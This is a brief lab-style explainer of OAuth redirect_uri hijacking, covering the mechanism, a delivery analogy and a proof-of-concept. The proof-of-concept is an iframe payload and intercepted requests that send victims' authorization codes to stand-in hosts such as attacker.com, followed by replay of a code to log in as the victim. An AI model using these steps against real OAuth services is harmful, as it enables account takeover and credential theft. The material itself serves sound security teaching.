OAuth Redirect URI Hijacking

[ FEYNMAN-STYLE EXPLANATION: SIMPLE ]

0x01: Basic Mechanism

In OAuth, after you log in, the system sends back something important to the app:

  • either an authorization code
  • or an access token
👉 This is like a proof that you are the user.

This is sent to a specific place called: redirect_uri (callback URL)

0x02: Where the Problem Happens

The OAuth server is supposed to:

  • only send the code/token to trusted URLs

But if it doesn’t properly check the redirect_uri, then:

👉 An attacker can change it to their own website.

So instead of: https://legit-app.com/callback

it becomes: https://attacker.com

0x03: The Exploit Chain
  1. Victim logs in (or already has a session)
  2. OAuth server generates a code
  3. Sends it to: https://attacker.com?code=XYZ
  4. Attacker now has the code
0x04: Why this is Critical

With that stolen code, the attacker sends it to the real app: /callback?code=XYZ

The app completes login and attacker is now logged in as the victim.

No password needed.

Important detail: Even protections like 'state' don’t fully stop this, because the attacker starts their own flow and just changes where the response goes.
0x05: The Analogy

Think of a delivery system:

  • You order a package (OAuth login)
  • The company asks: “Where should we deliver it?” (redirect_uri)
  • Normally: it delivers to your home (legit app)
  • But if the company doesn’t verify the address: someone changes it to “Send it to my house instead”

👉 Your package (code/token) goes to the attacker.

0x06: Real-World Lab Example

Request intercepted:

GET /auth?client_id=...&redirect_uri=https://attacker-server.com

Resulting redirect:

https://attacker-server.com?code=VICTIM_CODE

Check logs → VICTIM_CODE ACQUIRED

0x07: Exploit Flow (PoC)

1. Send victim this:

<iframe src="https://oauth-server/auth?...&redirect_uri=attacker.com"></iframe>

2. Victim loads it → OAuth runs silently

3. Code is sent to attacker

4. Attacker uses: /oauth-callback?code=VICTIM_CODE

→ Logged in as victim (admin in lab)

0x08: Root Issue (Technical)
  • OAuth server does not validate redirect_uri
  • Allows arbitrary external domains
  • Sends sensitive data (code/token) to attacker-controlled endpoint
ONE-LINE TAKEAWAY:
If redirect_uri is not strictly validated, attackers can steal authorization codes or tokens, leading to full account takeover.
